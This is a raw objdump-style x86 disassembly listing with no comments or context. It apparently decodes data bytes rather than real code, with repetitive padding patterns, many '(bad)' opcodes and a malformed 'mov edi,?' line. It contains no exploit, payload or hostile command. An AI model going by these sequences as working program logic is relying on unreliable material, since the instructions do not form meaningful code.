  44e4ba:	call   FWORD PTR [ebx]
  44e4bc:	and    eax,esp
  44e4be:	call   DWORD PTR [edi]
  44e4c0:	pop    ss
  44e4c1:	xor    edi,edi
  44e4c3:	sub    BYTE PTR [ecx+eax*2],ah
  44e4c6:	jmp    DWORD PTR [esi]
  44e4c8:	sub    ch,BYTE PTR [edx+0x360e07ff]
  44e4ce:	inc    DWORD PTR [eax]
  44e4d0:	add    DWORD PTR [edx],eax
  44e4d2:	inc    DWORD PTR [edx]
  44e4d4:	add    cl,BYTE PTR [edx]
  44e4d6:	inc    DWORD PTR [eax]
  44e4d8:	add    BYTE PTR ds:0x20100ff,al
  44e4de:	dec    DWORD PTR [ecx]
  44e4e0:	adc    dl,bl
  44e4e2:	call   FWORD PTR [esi]
  44e4e4:	pop    ss
  44e4e5:	call   FWORD PTR es:[ebx]
  44e4e8:	adc    eax,0x1f1eff23
  44e4ed:	cmp    bh,0x16
  44e4f0:	sub    DWORD PTR [esi-0x79f0fe01],edi
  44e4f6:	inc    DWORD PTR [edi]
  44e4f8:	adc    bh,bh
  44e4fa:	inc    DWORD PTR [eax]
  44e4fc:	add    DWORD PTR [edx],eax
  44e4fe:	inc    DWORD PTR [ebx+eax*1]
  44e501:	or     al,0xff
  44e503:	add    BYTE PTR [eax],al
  44e505:	or     edi,edi
  44e507:	add    BYTE PTR [eax],al
  44e509:	or     al,0xff
  44e50b:	add    BYTE PTR [eax],al
  44e50d:	or     al,0xff
  44e50f:	add    BYTE PTR [eax],al
  44e511:	or     eax,0xf0000ff
  44e516:	inc    DWORD PTR [eax]
  44e518:	add    BYTE PTR [esi],cl
  44e51a:	inc    DWORD PTR [eax]
  44e51c:	add    BYTE PTR [edi],cl
  44e51e:	inc    DWORD PTR [eax]
  44e520:	add    BYTE PTR [eax],dl
  44e522:	inc    DWORD PTR [eax]
  44e524:	add    BYTE PTR ds:0x20100ff,cl
  44e52a:	inc    DWORD PTR [eax]
  44e52c:	add    DWORD PTR [edx],eax
  44e52e:	inc    DWORD PTR [eax]
  44e530:	add    BYTE PTR [ecx],dl
  44e532:	inc    DWORD PTR [eax]
  44e534:	add    BYTE PTR [eax],dl
  44e536:	inc    DWORD PTR [eax]
  44e538:	add    BYTE PTR [edi],cl
  44e53a:	inc    DWORD PTR [eax]
  44e53c:	add    BYTE PTR [edi],cl
  44e53e:	inc    DWORD PTR [eax]
  44e540:	add    BYTE PTR [edi],cl
  44e542:	inc    DWORD PTR [eax]
  44e544:	add    DWORD PTR [edx],eax
  44e546:	inc    DWORD PTR [ebx+edx*1]
  44e549:	push   0x3d0f05ff
  44e54e:	dec    DWORD PTR [esi]
  44e550:	adc    BYTE PTR ds:0x431818ff,dh
  44e556:	dec    DWORD PTR [ebx]
  44e558:	push   cs
  44e559:	xor    bh,bh
  44e55b:	adc    ebp,DWORD PTR [ebx+eiz*4]
  44e55e:	inc    DWORD PTR [eax]
  44e560:	add    DWORD PTR [edx],eax
  44e562:	inc    DWORD PTR [eax]
  44e564:	add    BYTE PTR [ebx],cl
  44e566:	inc    DWORD PTR [eax]
  44e568:	add    BYTE PTR [ebx],cl
  44e56a:	inc    DWORD PTR [eax]
  44e56c:	add    BYTE PTR [ecx],cl
  44e56e:	inc    DWORD PTR [eax]
  44e570:	add    BYTE PTR [eax],al
  44e572:	inc    DWORD PTR [eax]
  44e574:	add    BYTE PTR [eax],al
  44e576:	inc    DWORD PTR [edi]
  44e578:	psubsw mm7,mm7
  44e57b:	and    bl,BYTE PTR [edi]
  44e57d:	pop    eax
  44e57e:	push   DWORD PTR ds:0xaff3e26
  44e584:	or     DWORD PTR [esi],ecx
  44e586:	call   FWORD PTR [ecx]
  44e588:	adc    esi,DWORD PTR [edx]
  44e58a:	inc    DWORD PTR [edi]
  44e58c:	daa    
  44e58d:	lods   eax,DWORD PTR ds:[esi]
  44e58e:	inc    DWORD PTR [eax]
  44e590:	add    DWORD PTR [edx],eax
  44e592:	inc    DWORD PTR [eax]
  44e594:	add    BYTE PTR [edi],al
  44e596:	inc    DWORD PTR [eax]
  44e598:	add    BYTE PTR ds:0x20100ff,al
  44e59e:	dec    DWORD PTR [ecx]
  44e5a0:	psrlq  mm7,mm7
  44e5a3:	sbb    edx,DWORD PTR [esp]
  44e5a6:	call   FWORD PTR [ebx]
  44e5a8:	push   ss
  44e5a9:	daa    
  44e5aa:	jmp    DWORD PTR [eax]
  44e5ac:	and    BYTE PTR [ebx-0x1],ah
  44e5af:	adc    al,0x16
  44e5b1:	cmp    eax,0x4f0704ff
  44e5b6:	dec    DWORD PTR [eax]
  44e5b8:	adc    bh,bh
  44e5ba:	inc    DWORD PTR [eax]
  44e5bc:	add    DWORD PTR [edx],eax
  44e5be:	inc    DWORD PTR [eax]
  44e5c0:	add    DWORD PTR [edx],eax
  44e5c2:	inc    DWORD PTR [eax]
  44e5c4:	add    BYTE PTR [edx],cl
  44e5c6:	inc    DWORD PTR [eax]
  44e5c8:	add    BYTE PTR [ebx],cl
  44e5ca:	inc    DWORD PTR [eax]
  44e5cc:	add    BYTE PTR [ebx],cl
  44e5ce:	inc    DWORD PTR [eax]
  44e5d0:	add    BYTE PTR [edx],cl
  44e5d2:	inc    DWORD PTR [eax]
  44e5d4:	add    BYTE PTR [edi+edi*8],cl
  44e5d7:	add    BYTE PTR [eax],al
  44e5d9:	or     al,0xff
  44e5db:	add    BYTE PTR [eax],al
  44e5dd:	or     al,0xff
  44e5df:	add    DWORD PTR [ecx],eax
  44e5e1:	add    bh,bh
  44e5e3:	add    BYTE PTR [ecx],al
  44e5e5:	add    bh,bh
  44e5e7:	or     DWORD PTR [edx],edx
  44e5e9:	(bad)  
  44e5ea:	inc    DWORD PTR [eax]
  44e5ec:	add    DWORD PTR [ebx],eax
  44e5ee:	inc    DWORD PTR [eax]
  44e5f0:	add    BYTE PTR [esi],cl
  44e5f2:	inc    DWORD PTR [eax]
  44e5f4:	add    BYTE PTR [esi],cl
  44e5f6:	inc    DWORD PTR [eax]
  44e5f8:	add    BYTE PTR [esi],cl
  44e5fa:	inc    DWORD PTR [eax]
  44e5fc:	add    BYTE PTR [edi],cl
  44e5fe:	inc    DWORD PTR [eax]
  44e600:	add    BYTE PTR [esi],cl
  44e602:	inc    DWORD PTR [eax]
  44e604:	add    DWORD PTR [edx],eax
  44e606:	inc    DWORD PTR [ecx]
  44e608:	pop    es
  44e609:	push   0xffffffff
  44e60b:	pop    es
  44e60c:	push   es
  44e60d:	dec    DWORD PTR ss:[eax]
  44e610:	or     ah,BYTE PTR [edi]
  44e612:	dec    DWORD PTR [edi]
  44e614:	push   cs
  44e615:	xor    bh,bh
  44e617:	adc    ecx,DWORD PTR [edi]
  44e619:	cmp    bh,bh
  44e61b:	adc    eax,0xffb93c
  44e620:	add    DWORD PTR [edx],eax
  44e622:	inc    DWORD PTR [esp+eax*1]
  44e625:	or     eax,0xb0000ff
  44e62a:	inc    DWORD PTR [eax]
  44e62c:	add    BYTE PTR [eax],al
  44e62e:	inc    DWORD PTR [ecx]
  44e630:	push   es
  44e631:	sbb    al,0xff
  44e633:	add    DWORD PTR [esp+ebx*1],eax
  44e636:	inc    DWORD PTR [eax]
  44e638:	add    DWORD PTR [ecx],edx
  44e63a:	dec    DWORD PTR [ebx]
  44e63c:	adc    ebp,edi
  44e63e:	jmp    DWORD PTR [edx]
  44e640:	sbb    BYTE PTR [eax],bh
  44e642:	call   DWORD PTR [edx]
  44e644:	or     al,0x18
  44e646:	call   FWORD PTR [eax]
  44e648:	sbb    BYTE PTR [esi-0x1],al
  44e64b:	push   es
  44e64c:	sbb    eax,0x100ff9f
  44e651:	add    bh,bh
  44e653:	add    BYTE PTR [eax],al
  44e655:	push   es
  44e656:	inc    DWORD PTR [eax]
  44e658:	add    BYTE PTR [edi+edi*8],al
  44e65b:	add    BYTE PTR [ecx],al
  44e65d:	add    bh,bh
  44e65f:	pop    es
  44e660:	push   cs
  44e661:	(bad)  
  44e662:	call   FWORD PTR [edx]
  44e664:	pop    ss
  44e665:	daa    
  44e666:	jmp    DWORD PTR [eax]
  44e668:	sbb    DWORD PTR [edi],esp
  44e66a:	call   DWORD PTR [edi+edx*1]
  44e66d:	arpl   di,di
  44e66f:	add    eax,DWORD PTR ds:0x100ff5b
  44e675:	arpl   di,di
  44e677:	add    BYTE PTR [ecx],al
  44e679:	ud0    ecx,DWORD PTR [eax]
  44e67c:	adc    bh,bh
  44e67e:	inc    DWORD PTR [eax]
  44e680:	add    DWORD PTR [edx],eax
  44e682:	inc    DWORD PTR [eax]
  44e684:	add    DWORD PTR [edx],eax
  44e686:	inc    DWORD PTR [eax]
  44e688:	add    BYTE PTR [edi+edi*8],al
  44e68b:	add    DWORD PTR [ecx],eax
  44e68d:	add    al,0xff
  44e68f:	add    BYTE PTR [eax],al
  44e691:	or     bh,bh
  44e693:	add    BYTE PTR [eax],al
  44e695:	or     edi,edi
  44e697:	add    eax,DWORD PTR [ebx]
  44e699:	ud0    eax,DWORD PTR [eax]
  44e69c:	add    BYTE PTR [eax],al
  44e69e:	inc    DWORD PTR [eax]
  44e6a0:	add    DWORD PTR [ebx],eax
  44e6a2:	dec    DWORD PTR [edx]
  44e6a4:	adc    edi,edi
  44e6a6:	dec    DWORD PTR [ebx]
  44e6a8:	sbb    edi,edi
  44e6aa:	inc    DWORD PTR [eax]
  44e6ac:	add    DWORD PTR [edx],eax
  44e6ae:	inc    DWORD PTR [eax]
  44e6b0:	add    BYTE PTR [ebx],cl
  44e6b2:	inc    DWORD PTR [eax]
  44e6b4:	add    BYTE PTR [edi+edi*8],cl
  44e6b7:	add    BYTE PTR [eax],al
  44e6b9:	push   cs
  44e6ba:	inc    DWORD PTR [eax]
  44e6bc:	add    BYTE PTR ds:0xc0000ff,cl
  44e6c2:	inc    DWORD PTR [eax]
  44e6c4:	add    DWORD PTR [edx],eax
  44e6c6:	inc    DWORD PTR [ecx]
  44e6c8:	or     ecx,DWORD PTR [edi+edi*8-0x4ef8ff]
  44e6cf:	or     edx,DWORD PTR [edx]
  44e6d1:	dec    DWORD PTR ds:[esi]
  44e6d4:	adc    al,0x32
  44e6d6:	jmp    DWORD PTR [ecx]
  44e6d8:	and    edx,DWORD PTR [ebp-0x1]
  44e6db:	or     DWORD PTR [ebx],esp
  44e6dd:	(bad)  
  44e6de:	inc    DWORD PTR [eax]
  44e6e0:	add    DWORD PTR [ebx],eax
  44e6e2:	inc    DWORD PTR [eax]
  44e6e4:	add    DWORD PTR [edx],eax
  44e6e6:	inc    DWORD PTR [eax]
  44e6e8:	add    DWORD PTR [edx],eax
  44e6ea:	inc    DWORD PTR [ecx]
  44e6ec:	add    esi,DWORD PTR ds:0xb1220bff
  44e6f2:	dec    DWORD PTR [eax+ebx*1]
  44e6f5:	scas   eax,DWORD PTR es:[edi]
  44e6f6:	call   FWORD PTR [edx]
  44e6f8:	adc    al,0x92
  44e6fa:	dec    DWORD PTR [ecx]
  44e6fc:	or     al,0x35
  44e6fe:	dec    DWORD PTR [ebx]
  44e700:	sbb    BYTE PTR [edx+0x26111aff],ah
  44e706:	call   DWORD PTR [eax+eiz*1]
  44e709:	popf   
  44e70a:	dec    DWORD PTR [eax]
  44e70c:	adc    bh,bh
  44e70e:	inc    DWORD PTR [ecx]
  44e710:	add    DWORD PTR [ecx],eax
  44e712:	inc    DWORD PTR [eax]
  44e714:	add    BYTE PTR [esi],al
  44e716:	inc    DWORD PTR [eax]
  44e718:	add    BYTE PTR [ebx],al
  44e71a:	inc    DWORD PTR [eax]
  44e71c:	add    BYTE PTR [eax],al
  44e71e:	inc    DWORD PTR [esi]
  44e720:	push   cs
  44e721:	(bad)  
  44e722:	call   FWORD PTR [eax]
  44e724:	sbb    edx,DWORD PTR [ebx-0x1]
  44e727:	sbb    DWORD PTR [ecx],ebx
  44e729:	dec    esp
  44e72a:	inc    DWORD PTR [edi]
  44e72c:	or     eax,0x902ff87
  44e731:	imul   edi,edi,0x0
  44e734:	add    DWORD PTR [edi],ebp
  44e736:	dec    DWORD PTR [ecx+ebx*1]
  44e739:	(bad)  
  44e73a:	call   FWORD PTR ds:0xbff621b
  44e740:	push   cs
  44e741:	ja     0x44e742
  44e743:	add    DWORD PTR [ebx],eax
  44e745:	outs   dx,DWORD PTR ds:[esi]
  44e746:	inc    DWORD PTR [eax]
  44e748:	add    DWORD PTR [ebx],eax
  44e74a:	inc    DWORD PTR [eax]
  44e74c:	add    DWORD PTR [edx],eax
  44e74e:	inc    DWORD PTR [eax]
  44e750:	add    DWORD PTR [ebx],eax
  44e752:	inc    DWORD PTR [eax]
  44e754:	add    DWORD PTR [ebx],eax
  44e756:	inc    DWORD PTR [eax]
  44e758:	add    DWORD PTR [eax],esp
  44e75a:	inc    DWORD PTR [eax]
  44e75c:	add    DWORD PTR [ebx],eax
  44e75e:	dec    DWORD PTR [ecx]
  44e760:	push   ss
  44e761:	(bad)  
  44e762:	call   DWORD PTR [edx]
  44e764:	sbb    eax,0x1e0eff53
  44e769:	(bad)  
  44e76a:	inc    DWORD PTR [eax]
  44e76c:	add    DWORD PTR [ebx],eax
  44e76e:	inc    DWORD PTR [eax]
  44e770:	add    BYTE PTR [ecx],cl
  44e772:	inc    DWORD PTR [eax]
  44e774:	add    BYTE PTR [ecx],cl
  44e776:	inc    DWORD PTR [eax]
  44e778:	add    BYTE PTR [edx],cl
  44e77a:	inc    DWORD PTR [eax]
  44e77c:	add    BYTE PTR [ecx],cl
  44e77e:	inc    DWORD PTR [eax]
  44e780:	add    BYTE PTR [ecx],cl
  44e782:	inc    DWORD PTR [eax]
  44e784:	add    DWORD PTR [edx],eax
  44e786:	inc    DWORD PTR [ecx]
  44e788:	adc    BYTE PTR [ecx-0x6ff0f901],ah
  44e78e:	dec    DWORD PTR ds:0x23ff5010
  44e794:	and    DWORD PTR [esi],edi
  44e796:	call   FWORD PTR [ecx]
  44e798:	sub    BYTE PTR [edi-0xeff801],dl
  44e79e:	inc    DWORD PTR [edx]
  44e7a0:	add    eax,0x902ff10
  44e7a5:	inc    ebx
  44e7a6:	inc    DWORD PTR [ecx]
  44e7a8:	add    al,0x29
  44e7aa:	inc    DWORD PTR [ecx]
  44e7ac:	add    eax,0x1510ff67
  44e7b1:	inc    ecx
  44e7b2:	call   DWORD PTR [edi]
  44e7b4:	adc    eax,0x171aff39
  44e7b9:	dec    edi
  44e7ba:	call   DWORD PTR [ebx]
  44e7bc:	adc    BYTE PTR [ebx],ch
  44e7be:	inc    DWORD PTR [ebx]
  44e7c0:	push   es
  44e7c1:	das    
  44e7c2:	call   DWORD PTR [ecx]
  44e7c4:	push   ss
  44e7c5:	jbe    0x44e7c6
  44e7c7:	or     BYTE PTR [edx],dl
  44e7c9:	(bad)  
  44e7ca:	inc    DWORD PTR [eax]
  44e7cc:	add    DWORD PTR [ebx],eax
  44e7ce:	inc    DWORD PTR [eax]
  44e7d0:	add    BYTE PTR ds:0x30000ff,al
  44e7d6:	inc    DWORD PTR [eax]
  44e7d8:	add    BYTE PTR [eax],al
  44e7da:	inc    DWORD PTR [eax]
  44e7dc:	add    BYTE PTR [eax],al
  44e7de:	inc    DWORD PTR [eax]
  44e7e0:	add    DWORD PTR [edx],eax
  44e7e2:	dec    DWORD PTR [eax]
  44e7e4:	adc    edi,edi
  44e7e6:	dec    DWORD PTR [edx]
  44e7e8:	push   cs
  44e7e9:	mov    edi,?
  44e7eb:	push   es
  44e7ec:	or     al,0x79
  44e7ee:	inc    DWORD PTR [ebx]
  44e7f0:	add    eax,0x1209ff32
  44e7f5:	(bad)  
  44e7f6:	jmp    FWORD PTR ds:0x29ff4423
  44e7fc:	sbb    al,0x26
  44e7fe:	call   FWORD PTR [edx*1+0x1013ff57]
  44e805:	mov    esp,0x892727ff
  44e80a:	dec    DWORD PTR [edi]
  44e80c:	sbb    eax,0x1a0dff92
  44e811:	(bad)  
  44e813:	adc    eax,0xeffda30
  44e818:	push   ss
  44e819:	xchg   edi,eax
  44e81a:	call   DWORD PTR [ebx]
  44e81c:	push   ds
  44e81d:	jns    0x44e81e
  44e81f:	adc    DWORD PTR [esi],ebx
  44e821:	xchg   bh,bh
  44e823:	or     eax,0xbff6715
  44e828:	pop    ss
  44e829:	(bad)  
  44e82a:	inc    DWORD PTR [eax]
  44e82c:	add    DWORD PTR [ebx],eax
  44e82e:	inc    DWORD PTR [eax]
  44e830:	add    BYTE PTR [eax],al
  44e832:	inc    DWORD PTR [eax]
  44e834:	add    BYTE PTR [eax],al
  44e836:	inc    DWORD PTR [eax]
  44e838:	add    BYTE PTR [eax],al
  44e83a:	inc    DWORD PTR [eax]
  44e83c:	add    BYTE PTR [eax],al
  44e83e:	inc    DWORD PTR [eax]
  44e840:	add    BYTE PTR [eax],al
  44e842:	inc    DWORD PTR [eax]
  44e844:	add    DWORD PTR [edx],eax
  44e846:	inc    DWORD PTR [esp+ecx*1]
  44e849:	mov    dh,0xff
  44e84b:	or     edx,DWORD PTR [edx]
  44e84d:	cmp    eax,0x160d0dff
  44e852:	call   DWORD PTR [ebx]
  44e854:	pop    ss
  44e855:	inc    DWORD PTR ds:[edi]
  44e858:	adc    bh,bh
  44e85a:	inc    DWORD PTR [eax]
  44e85c:	add    DWORD PTR [ebx],ecx
  44e85e:	dec    DWORD PTR [ebx]
  44e860:	sbb    DWORD PTR [edi-0x1],ebp
  44e863:	or     ebx,DWORD PTR [ecx]
  44e865:	popf   
  44e866:	inc    DWORD PTR [ecx]
  44e868:	add    DWORD PTR [ecx+0x600b06ff],esp
  44e86e:	call   FWORD PTR ds:0x1aff2b1b
  44e874:	push   ss
  44e875:	and    al,0xff
  44e877:	or     ecx,DWORD PTR [edx]
  44e879:	das    
  44e87a:	call   DWORD PTR [esi]
  44e87c:	adc    bh,BYTE PTR [ecx]
  44e87e:	inc    DWORD PTR [eax]
  44e880:	add    DWORD PTR [eax],edx
  44e882:	dec    DWORD PTR [ecx]
  44e884:	adc    eax,0x100ffff
  44e889:	add    edi,edi
  44e88b:	add    BYTE PTR [eax],al
  44e88d:	add    bh,bh
  44e88f:	add    BYTE PTR [eax],al
  44e891:	add    bh,bh
  44e893:	add    BYTE PTR [eax],al
  44e895:	add    bh,bh
  44e897:	add    BYTE PTR [eax],al
  44e899:	add    bh,bh
  44e89b:	add    BYTE PTR [eax],al
  44e89d:	add    bh,bh
  44e89f:	add    BYTE PTR [eax],al
  44e8a1:	add    bh,bh
  44e8a3:	add    BYTE PTR [ecx],al
  44e8a5:	add    bh,bh
  44e8a7:	or     DWORD PTR [ecx],edx
  44e8a9:	(bad)  
  44e8aa:	call   DWORD PTR [edi]
  44e8ac:	adc    al,0x28
  44e8ae:	dec    DWORD PTR [esi]
  44e8b0:	push   ss
  44e8b1:	(bad)  
  44e8b3:	pop    ss
  44e8b4:	adc    DWORD PTR [eax],ebp
  44e8b6:	jmp    DWORD PTR [ebx*1+0x1b25ff52]
  44e8bd:	xor    edi,edi
  44e8bf:	sbb    edx,DWORD PTR [ecx]
  44e8c1:	inc    edx
  44e8c2:	call   DWORD PTR ds:0x2dff860e
  44e8c8:	and    dh,BYTE PTR [edi+edi*8]
  44e8cb:	and    BYTE PTR [edi],bl
  44e8cd:	cmp    bh,bh
  44e8cf:	and    DWORD PTR [edx],ebx
  44e8d1:	pop    ebx
  44e8d2:	call   DWORD PTR ds:0x1bff571a
  44e8d8:	sbb    eax,0x1c14ff4b
  44e8dd:	pop    esp
  44e8de:	call   DWORD PTR [ebx]
  44e8e0:	pop    ss
  44e8e1:	dec    edi
  44e8e2:	call   DWORD PTR [edx]
  44e8e4:	sbb    BYTE PTR [eax-0x1],ch
  44e8e7:	push   cs
  44e8e8:	pop    ds
  44e8e9:	(bad)  
  44e8ea:	inc    DWORD PTR [eax]
  44e8ec:	add    DWORD PTR [ebx],eax
  44e8ee:	inc    DWORD PTR [eax]
  44e8f0:	add    BYTE PTR [eax],al
  44e8f2:	inc    DWORD PTR [eax]
  44e8f4:	add    BYTE PTR [eax],al
  44e8f6:	inc    DWORD PTR [eax]
  44e8f8:	add    BYTE PTR [eax],al
  44e8fa:	inc    DWORD PTR [eax]
  44e8fc:	add    BYTE PTR [eax],al
  44e8fe:	inc    DWORD PTR [eax]
  44e900:	add    BYTE PTR [eax],al
  44e902:	inc    DWORD PTR [eax]
  44e904:	add    DWORD PTR [ebx],eax
  44e906:	dec    DWORD PTR [ebx]
  44e908:	and    eax,ecx
  44e90a:	dec    DWORD PTR [ebx]
  44e90c:	push   cs
  44e90d:	xor    edi,edi
  44e90f:	or     cl,BYTE PTR [edx]
  44e911:	dec    DWORD PTR ss:[ecx]
  44e914:	adc    eax,0x100ffff
  44e919:	or     eax,0x57110fff
  44e91e:	dec    DWORD PTR [edi]
  44e920:	adc    DWORD PTR [ebx],esi
  44e922:	inc    DWORD PTR [eax*1+0x1414ff63]
  44e929:	popf   
  44e92a:	call   DWORD PTR [esp+edx*1]
  44e92d:	cmp    al,0xff
  44e92f:	and    al,0x1f
  44e931:	cmp    bh,bh
  44e933:	and    ebx,DWORD PTR [esi]
  44e935:	cmp    edi,edi
  44e937:	sbb    al,0x1c
  44e939:	outs   dx,BYTE PTR ds:[esi]
  44e93a:	jmp    FWORD PTR [edx]
  44e93c:	sub    DWORD PTR [eax+0x1b0401ff],esi
  44e942:	inc    DWORD PTR [ecx]
  44e944:	add    cl,BYTE PTR [esi]
  44e946:	inc    DWORD PTR [eax]
  44e948:	add    DWORD PTR [edx],eax
  44e94a:	inc    DWORD PTR [eax]
  44e94c:	add    BYTE PTR [eax],al
  44e94e:	inc    DWORD PTR [eax]
  44e950:	add    BYTE PTR [eax],al
  44e952:	inc    DWORD PTR [eax]
  44e954:	add    BYTE PTR [eax],al
  44e956:	inc    DWORD PTR [eax]
  44e958:	add    BYTE PTR [eax],al
  44e95a:	inc    DWORD PTR [eax]
  44e95c:	add    BYTE PTR [eax],al
  44e95e:	inc    DWORD PTR [eax]
  44e960:	add    BYTE PTR [eax],al
  44e962:	inc    DWORD PTR [eax]
  44e964:	add    BYTE PTR [eax],al
  44e966:	inc    DWORD PTR [eax]
  44e968:	add    DWORD PTR [ebx],eax
  44e96a:	dec    DWORD PTR [ebx]
  44e96c:	adc    eax,0x171cffff
  44e971:	push   edi
  44e972:	dec    DWORD PTR [eax+ecx*1]
  44e975:	and    bh,bh
  44e977:	or     al,BYTE PTR [edi]
  44e979:	inc    eax
  44e97a:	call   DWORD PTR [edx]
  44e97c:	push   cs
  44e97d:	daa    
  44e97e:	jmp    DWORD PTR ds:0x14ff3c18
  44e984:	or     dl,BYTE PTR [esi-0x1]
  44e987:	sub    esp,DWORD PTR [edx]
  44e989:	dec    ebp
  44e98a:	call   FWORD PTR [esi+edx*1]
  44e98d:	and    edi,edi
  44e98f:	adc    DWORD PTR [edx+edi*1],edx
  44e992:	dec    DWORD PTR [edx]
  44e994:	adc    al,0xc6
  44e996:	dec    DWORD PTR [edx]
  44e998:	adc    BYTE PTR [esi],dh
  44e99a:	dec    DWORD PTR [edx]
  44e99c:	adc    BYTE PTR [esi-0x1],ch
  44e99f:	push   es
  44e9a0:	or     BYTE PTR [ebx-0x1],bl
  44e9a3:	push   cs
  44e9a4:	adc    BYTE PTR [eax],dh
  44e9a6:	dec    DWORD PTR [edx]
  44e9a8:	push   ds
  44e9a9:	(bad)  
  44e9aa:	inc    DWORD PTR [eax]
  44e9ac:	add    DWORD PTR [ebx],eax
  44e9ae:	inc    DWORD PTR [eax]
  44e9b0:	add    BYTE PTR [eax],al
  44e9b2:	inc    DWORD PTR [eax]
  44e9b4:	add    BYTE PTR [eax],al
  44e9b6:	inc    DWORD PTR [eax]
  44e9b8:	add    BYTE PTR [eax],al
  44e9ba:	inc    DWORD PTR [eax]
  44e9bc:	add    BYTE PTR [eax],al
  44e9be:	inc    DWORD PTR [eax]
  44e9c0:	add    BYTE PTR [eax],al
  44e9c2:	inc    DWORD PTR [ecx]
  44e9c4:	jo     0xc163f6c9
  44e9ca:	dec    DWORD PTR ds:0x8ff330b
  44e9d0:	movzx  edi,di
  44e9d3:	add    eax,0x17ff2a06
  44e9d8:	adc    al,0x48
  44e9da:	call   DWORD PTR [edx+edx*1]
  44e9dd:	das    
  44e9de:	dec    DWORD PTR [ecx]
  44e9e0:	adc    BYTE PTR [esi],bl
  44e9e2:	dec    DWORD PTR [eax]
  44e9e4:	or     BYTE PTR [ebx-0x1],al
  44e9e7:	sbb    al,0x18
  44e9e9:	cmp    eax,0x2a0c0dff
  44e9ee:	jmp    FWORD PTR [eiz*1+0x2a2eff39]
  44e9f5:	inc    ebp
  44e9f6:	call   FWORD PTR ds:0x9ffab25
  44e9fc:	pop    ss
  44e9fd:	(bad)  
  44e9ff:	or     BYTE PTR [edi],bl
  44ea01:	stos   BYTE PTR es:[edi],al
  44ea02:	inc    DWORD PTR [edx]
  44ea04:	add    al,BYTE PTR [ebx]
  44ea06:	inc    DWORD PTR [ecx]
  44ea08:	add    DWORD PTR [ecx],eax
  44ea0a:	inc    DWORD PTR [eax]
  44ea0c:	add    BYTE PTR [eax],al
  44ea0e:	inc    DWORD PTR [eax]
  44ea10:	add    BYTE PTR [eax],al
  44ea12:	inc    DWORD PTR [eax]
  44ea14:	add    BYTE PTR [eax],al
  44ea16:	inc    DWORD PTR [eax]
  44ea18:	add    BYTE PTR [eax],al
  44ea1a:	inc    DWORD PTR [eax]
  44ea1c:	add    BYTE PTR [eax],al
  44ea1e:	inc    DWORD PTR [eax]
  44ea20:	add    BYTE PTR [eax],al
  44ea22:	inc    DWORD PTR [eax]
  44ea24:	add    BYTE PTR [eax],al
  44ea26:	inc    DWORD PTR [eax]
  44ea28:	add    BYTE PTR [eax],al
  44ea2a:	inc    DWORD PTR [eax]
  44ea2c:	add    DWORD PTR [edx],eax
  44ea2e:	dec    DWORD PTR [edx+ebx*1]
  44ea31:	(bad)  
  44ea32:	inc    DWORD PTR [edi]
  44ea34:	or     DWORD PTR [ebp+0x550f11ff],eax
  44ea3a:	jmp    DWORD PTR [esi]
  44ea3c:	push   ds
  44ea3d:	push   DWORD PTR cs:[ebx+eiz*1]
  44ea41:	inc    esi
  44ea42:	dec    DWORD PTR [esi]
  44ea44:	or     BYTE PTR [esi],dh
  44ea46:	call   DWORD PTR [eax]
  44ea48:	andps  xmm7,xmm7
  44ea4b:	push   ss
  44ea4c:	adc    ebx,DWORD PTR [edi+edi*8]
  44ea4f:	sbb    al,0x20
  44ea51:	push   edx
  44ea52:	dec    DWORD PTR [eax]
  44ea54:	adc    BYTE PTR [ecx+0x260f14ff],bh
  44ea5a:	call   DWORD PTR [edx]
  44ea5c:	adc    BYTE PTR [ecx],bh
  44ea5e:	dec    DWORD PTR ds:0x1affac10
  44ea64:	sbb    BYTE PTR ds:0xff1e0bff,dh
  44ea6a:	inc    DWORD PTR [eax]
  44ea6c:	add    DWORD PTR [edx],eax
  44ea6e:	inc    DWORD PTR [eax]
  44ea70:	add    BYTE PTR [eax],al
  44ea72:	inc    DWORD PTR [eax]
  44ea74:	add    BYTE PTR [eax],al
  44ea76:	inc    DWORD PTR [eax]
  44ea78:	add    BYTE PTR [eax],al
  44ea7a:	inc    DWORD PTR [eax]
  44ea7c:	add    BYTE PTR [eax],al
  44ea7e:	inc    DWORD PTR [eax]
  44ea80:	add    ebp,DWORD PTR [eax]
  44ea82:	dec    DWORD PTR [edx]
  44ea84:	sbb    eax,0x1b13ffd2
  44ea89:	jo     0x44ea8a
  44ea8b:	or     al,0x12
  44ea8d:	(bad)  
  44ea8e:	call   DWORD PTR [eax]
  44ea90:	adc    al,BYTE PTR [edi-0x1]
  44ea93:	sub    ebp,DWORD PTR ds:0x1b24ff8e
  44ea99:	inc    esp
  44ea9a:	call   FWORD PTR [ebx]
  44ea9c:	sbb    BYTE PTR ds:0x551712ff,dh
  44eaa2:	call   DWORD PTR [ebx]
  44eaa4:	adc    BYTE PTR [edx-0x1],cl
  44eaa7:	cs es dec edi
  44eaaa:	jmp    FWORD PTR [ecx]
  44eaac:	and    al,BYTE PTR [edi+edi*8+0x39]
  44eab0:	xor    al,0x51
  44eab2:	dec    DWORD PTR [eax+0x53]
  44eab5:	mov    bh,0xff
  44eab7:	push   cs
  44eab8:	and    edi,edi
  44eaba:	inc    DWORD PTR [ecx]
  44eabc:	push   cs
  44eabd:	mov    esp,0x30100ff
  44eac2:	inc    DWORD PTR [ecx]
  44eac4:	add    BYTE PTR [eax],al
  44eac6:	inc    DWORD PTR [eax]
  44eac8:	add    BYTE PTR [eax],al
  44eaca:	inc    DWORD PTR [eax]
  44eacc:	add    BYTE PTR [eax],al
  44eace:	inc    DWORD PTR [eax]
  44ead0:	add    BYTE PTR [eax],al
  44ead2:	inc    DWORD PTR [eax]
  44ead4:	add    BYTE PTR [eax],al
  44ead6:	inc    DWORD PTR [eax]
  44ead8:	add    BYTE PTR [eax],al
  44eada:	inc    DWORD PTR [eax]
  44eadc:	add    BYTE PTR [eax],al
  44eade:	inc    DWORD PTR [eax]
  44eae0:	add    BYTE PTR [eax],al
  44eae2:	inc    DWORD PTR [eax]
  44eae4:	add    BYTE PTR [eax],al
  44eae6:	inc    DWORD PTR [eax]
  44eae8:	add    BYTE PTR [eax],al
  44eaea:	inc    DWORD PTR [eax]
  44eaec:	add    BYTE PTR [eax],al
  44eaee:	inc    DWORD PTR [eax]
  44eaf0:	add    DWORD PTR [ebx],eax
  44eaf2:	dec    DWORD PTR [edx]
  44eaf4:	push   ss
  44eaf5:	(bad)  
  44eaf6:	inc    DWORD PTR [edi]
  44eaf8:	or     al,0xb5
  44eafa:	dec    DWORD PTR [ebx+ecx*1]
  44eafd:	dec    edx
  44eafe:	jmp    DWORD PTR [eax+ebx*1]
  44eb01:	jb     0x44eb02
